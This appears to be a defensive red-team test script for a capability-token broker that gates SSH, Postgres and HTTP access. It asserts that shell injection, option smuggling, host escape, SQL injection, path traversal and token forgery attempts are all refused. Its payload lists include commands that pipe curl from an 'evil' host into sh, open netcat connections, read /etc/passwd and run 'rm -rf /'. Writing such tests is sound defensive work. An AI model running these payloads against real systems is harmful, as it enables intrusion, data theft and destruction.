#!/usr/bin/env python3
"""Adversarial validation. Run: python validate/redteam.py

Every case below is an ATTACK. Each one must be refused. The suite exits
non-zero if any attack succeeds, so it belongs in CI and in your pre-release
checklist.

This is deliberately separate from tests/. Unit tests check that the code does
what you meant. This checks that the system refuses what someone else meant.
Payloads are drawn from real published bypasses wherever one exists, because
attacks invented by the author of a defence tend to be the ones the defence
already handles.
"""

from __future__ import annotations

import sys
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

import taper.chain as chain_mod                                                  # noqa: E402
from taper.adapters import HTTPAdapter, PostgresAdapter, SSHAdapter              # noqa: E402
from taper.broker import Broker                                                  # noqa: E402
from taper.caps import Never, OneOf, Prefix, Range, Subset                       # noqa: E402
from taper.chain import ChainError, Token, verify                                # noqa: E402

NOW = 1_756_000_000.0
GREEN, RED, YELLOW, DIM, BOLD, OFF = (
    "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[1m", "\033[0m")


@dataclass
class Report:
    passed: int = 0
    failed: list[str] = field(default_factory=list)

    def check(self, name: str, refused: bool, detail: str = "") -> None:
        if refused:
            self.passed += 1
            print(f"  {GREEN}✓ refused{OFF}  {name}")
            if detail:
                print(f"            {DIM}{detail}{OFF}")
        else:
            self.failed.append(name)
            print(f"  {RED}✗ ALLOWED{OFF} {name}   {RED}<-- ATTACK SUCCEEDED{OFF}")
            if detail:
                print(f"            {detail}")


def section(title: str) -> None:
    print(f"\n{BOLD}{title}{OFF}\n" + "─" * 72)


root = Ed25519PrivateKey.generate()

FULL = {
    "ssh.exec": {
        "host": OneOf(["build-1.internal"]),
        "program": OneOf(["git", "make"]),
        "args": Subset(["status", "log", "build", "--oneline"]),
    },
    "pg.query": {
        "database": OneOf(["analytics"]),
        "statement_kind": OneOf(["select"]),
        "tables": Subset(["public.events"]),
        "max_rows": Range(0, 100),
    },
    "http.request": {
        "method": OneOf(["GET"]),
        "host": OneOf(["api.example.com"]),
        "path": Prefix("/v1/"),
    },
}


def new_broker(tmp: Path) -> Broker:
    return Broker(
        root_pub=root.public_key(),
        adapters={"ssh.exec": SSHAdapter(), "pg.query": PostgresAdapter(),
                  "http.request": HTTPAdapter()},
        audit_path=tmp / "redteam-audit.jsonl",
        clock=lambda: NOW,
    )


def run(report: Report, tmp: Path) -> None:
    broker = new_broker(tmp)
    token = Token.issue(root, FULL, ttl_seconds=3600, now=NOW)
    wire = token.serialize()

    def denied(op: str, request: dict) -> tuple[bool, str]:
        d = broker.decide(wire, op, request)
        return (not d.allowed), d.reason

    # ---------------------------------------------------------------------
    section("1. Shell injection — must be impossible to express, not filtered")
    # If any of these reach policy evaluation at all, the typed-schema layer has
    # a hole. They should die in field validation.
    for payload in [
        "status; rm -rf /",
        "status && curl http://evil/x | sh",
        "status`whoami`",
        "$(cat /etc/passwd)",
        "status\nrm -rf /",
        "status | nc evil 1234",
        "status > /etc/cron.d/x",
        "--upload-pack=sh",                    # git-shell style option injection
        "-e/bin/sh",                           # rsync --rsh style
        "--output=/root/.ssh/authorized_keys",
    ]:
        ok, reason = denied("ssh.exec",
                            {"host": "build-1.internal", "program": "git",
                             "args": [payload]})
        report.check(f"arg {payload!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("2. Option smuggling in the program slot")
    for program in ["bash", "sh", "/bin/sh", "git;bash", "../../bin/bash", "ssh"]:
        ok, reason = denied("ssh.exec",
                            {"host": "build-1.internal", "program": program,
                             "args": []})
        report.check(f"program {program!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("3. Host escape")
    for host in ["prod-db.internal", "build-1.internal:2222",
                 "build-1.internal evil.internal", "evil.internal#build-1.internal",
                 "-oProxyCommand=sh"]:
        ok, reason = denied("ssh.exec",
                            {"host": host, "program": "git", "args": ["status"]})
        report.check(f"host {host!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("4. Extra fields — the smuggling channel unknown-field handling opens")
    for extra in [{"shell": "/bin/sh"}, {"env": "LD_PRELOAD=/tmp/x"},
                  {"ProxyCommand": "sh"}, {"args_": ["build"]}]:
        request = {"host": "build-1.internal", "program": "git",
                   "args": ["status"], **extra}
        ok, reason = denied("ssh.exec", request)
        report.check(f"extra field {list(extra)[0]!r}", ok, reason if not ok else "")

    # ---------------------------------------------------------------------
    section("5. SQL — including the real pgAdmin CVE-2026-17351 payload")
    # The point of this section is NOT that the classifier catches everything.
    # It is that statement_kind is checked at all, and that the grant is
    # SELECT-only, so anything the classifier reads as non-select dies here and
    # anything it misreads still meets a read-only role at the database.
    for label, statement in [
        ("DDL", "DROP TABLE public.events"),
        ("write under select-only grant", "DELETE FROM public.events"),
        ("COPY ... FROM PROGRAM", "COPY x FROM PROGRAM 'curl http://evil|sh'"),
        ("DO block", "DO $$ BEGIN PERFORM 1; END $$"),
        ("stacked statements", "SELECT 1; DROP TABLE public.events"),
        ("pgAdmin backslash-quote bypass",
         r"SELECT 'a\'; COMMIT; DROP TABLE public.events; --"),
        ("table outside grant", "SELECT * FROM public.users"),
        ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
        ("dblink to another server",
         "SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)"),
    ]:
        ok, reason = denied("pg.query",
                            {"database": "analytics", "statement": statement,
                             "max_rows": 10})
        report.check(f"sql: {label}", ok, reason if not ok else "")

    print(f"\n  {YELLOW}note{OFF} the classifier is a fast-fail, not the boundary. "
          f"validate/check_postgres.py\n       proves the DATABASE refuses these "
          f"independently. Run both.")

    # ---------------------------------------------------------------------
    section("6. HTTP — path traversal and credential redirection")
    for label, request in [
        ("traversal", {"method": "GET", "host": "api.example.com",
                       "path": "/v1/../../admin"}),
        ("wrong host", {"method": "GET", "host": "evil.example.com", "path": "/v1/x"}),
        ("method escalation", {"method": "DELETE", "host": "api.example.com",
                               "path": "/v1/x"}),
        ("path outside prefix", {"method": "GET", "host": "api.example.com",
                                 "path": "/admin/keys"}),
        ("header injection", {"method": "GET", "host": "api.example.com",
                              "path": "/v1/x\nX-Evil: 1"}),
    ]:
        ok, reason = denied("http.request", request)
        report.check(f"http: {label}", ok, reason if not ok else "")

    # A traversal that policy ALLOWS because the prefix still matches is a real
    # residual risk. Say so out loud rather than pretending otherwise.
    d = broker.decide(wire, "http.request",
                      {"method": "GET", "host": "api.example.com",
                       "path": "/v1/../../admin"})
    if d.allowed:
        print(f"  {YELLOW}!{OFF} traversal within prefix reached policy — normalize "
              f"paths before matching")

    # ---------------------------------------------------------------------
    section("7. Token attacks")

    ok = True
    try:
        token.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal", "prod-db"]),
                                      "program": OneOf(["git"]),
                                      "args": Subset(["status"])}}, now=NOW)
        ok = False
    except ChainError:
        pass
    report.check("widen host during attenuation", ok)

    ok = True
    try:
        token.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal"]),
                                      "program": OneOf(["git", "bash"]),
                                      "args": Subset(["status"])}}, now=NOW)
        ok = False
    except ChainError:
        pass
    report.check("add a program during attenuation", ok)

    # Forge a correctly-signed widening block using the ephemeral key the holder
    # legitimately holds. This is the strongest attack in the suite.
    child = token.attenuate(
        {"ssh.exec": {"host": OneOf(["build-1.internal"]),
                      "program": OneOf(["git"]), "args": Subset(["status"])}},
        now=NOW)
    forged_block = chain_mod.Block(
        index=2,
        caps={"ssh.exec": {"host": OneOf(["prod-db.internal"]),
                           "program": OneOf(["bash"]), "args": Subset(["-c"])}},
        next_pub=chain_mod._pub_bytes(Ed25519PrivateKey.generate().public_key()),
        not_after=child.blocks[-1].not_after,
        prev_hash=child.blocks[-1].hash(),
    )
    forged_block.signature = child._next_priv.sign(forged_block.payload())
    forged = chain_mod.Token(blocks=child.blocks + [forged_block])

    refused = False
    try:
        verify(forged, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("forged widening block (strict verify)", refused)

    caps = verify(forged, root.public_key(), now=NOW, strict=False)
    report.check("forged widening block (intersection, strict OFF)",
                 isinstance(caps["ssh.exec"]["host"], Never),
                 "even with the guardrail disabled, effective host = Never")

    # Splice a block from another chain.
    other = Token.issue(root, FULL, ttl_seconds=3600, now=NOW)
    spliced = chain_mod.Token(blocks=[other.blocks[0], child.blocks[1]])
    refused = False
    try:
        verify(spliced, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("splice a block from another chain", refused)

    # Edit capabilities in place.
    tampered = Token.deserialize(token.serialize())
    tampered.blocks[0].caps["ssh.exec"]["program"] = OneOf(["git", "bash"])
    refused = False
    try:
        verify(tampered, root.public_key(), now=NOW)
    except ChainError:
        refused = True
    report.check("edit capabilities in an existing block", refused)

    # Extend TTL beyond the parent.
    long_child = token.attenuate(
        {"ssh.exec": {"host": OneOf(["build-1.internal"]),
                      "program": OneOf(["git"]), "args": Subset(["status"])}},
        ttl_seconds=86_400 * 30, now=NOW)
    report.check("extend TTL beyond parent",
                 long_child.expires_at() <= token.expires_at(),
                 f"child expires at parent's {int(token.expires_at() - NOW)}s")

    # Replay after expiry and after revocation.
    expired = Token.issue(root, FULL, ttl_seconds=10, now=NOW)
    refused = False
    try:
        verify(expired, root.public_key(), now=NOW + 11)
    except ChainError:
        refused = True
    report.check("replay an expired token", refused)

    revoked_broker = new_broker(tmp)
    revoked_broker.revoke(token.revocation_ids()[0])
    d = revoked_broker.decide(child.serialize(), "ssh.exec",
                              {"host": "build-1.internal", "program": "git",
                               "args": ["status"]})
    report.check("use a child of a revoked parent", not d.allowed, d.reason)

    # Attenuate a token you merely received over the wire.
    received = Token.deserialize(child.serialize())
    refused = False
    try:
        received.attenuate({"ssh.exec": {"host": OneOf(["build-1.internal"]),
                                         "program": OneOf(["git"]),
                                         "args": Subset([])}}, now=NOW)
    except ChainError:
        refused = True
    report.check("mint a sibling from a received token", refused,
                 "ephemeral signing key is never serialized")

    # Sign with the wrong root.
    impostor = Ed25519PrivateKey.generate()
    fake = Token.issue(impostor, FULL, ttl_seconds=3600, now=NOW)
    d = broker.decide(fake.serialize(), "ssh.exec",
                      {"host": "build-1.internal", "program": "git",
                       "args": ["status"]})
    report.check("token signed by a different root", not d.allowed, d.reason)

    # Malformed input should deny, never crash.
    for junk in ["", "!!!", "e30", "eyJiIjpbXX0", "A" * 10_000, "null"]:
        d = broker.decide(junk, "ssh.exec",
                          {"host": "build-1.internal", "program": "git"})
        report.check(f"malformed token {junk[:12]!r}", not d.allowed)

    # ---------------------------------------------------------------------
    section("8. Audit integrity")
    intact, _ = broker.audit.verify()
    report.check("audit chain intact after the whole run", intact)

    records = list(broker.audit.read())
    denials = sum(1 for r in records if not r["body"]["allowed"])
    report.check("every denial was recorded", denials > 30,
                 f"{denials} denials logged out of {len(records)} records")

    lines = broker.audit.path.read_text().splitlines()
    if len(lines) > 3:
        del lines[2]
        broker.audit.path.write_text("\n".join(lines) + "\n")
        intact_after, index = broker.audit.verify()
        report.check("deleting a record is detected", not intact_after,
                     f"chain breaks at record {index}")


def main() -> int:
    import tempfile

    print(f"{BOLD}Taper red-team validation{OFF}")
    print(f"{DIM}Every case is an attack. All must be refused.{OFF}")

    report = Report()
    with tempfile.TemporaryDirectory() as tmp:
        run(report, Path(tmp))

    total = report.passed + len(report.failed)
    print("\n" + "═" * 72)
    if report.failed:
        print(f"{RED}{BOLD}FAIL{OFF}  {len(report.failed)} of {total} attacks succeeded:")
        for name in report.failed:
            print(f"  {RED}•{OFF} {name}")
        return 1
    print(f"{GREEN}{BOLD}PASS{OFF}  all {total} attacks refused")
    print(f"{DIM}Reminder: this validates the decision layer. Run "
          f"validate/check_postgres.py and{OFF}")
    print(f"{DIM}validate/check_ssh.sh to prove the real boundaries hold "
          f"independently.{OFF}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
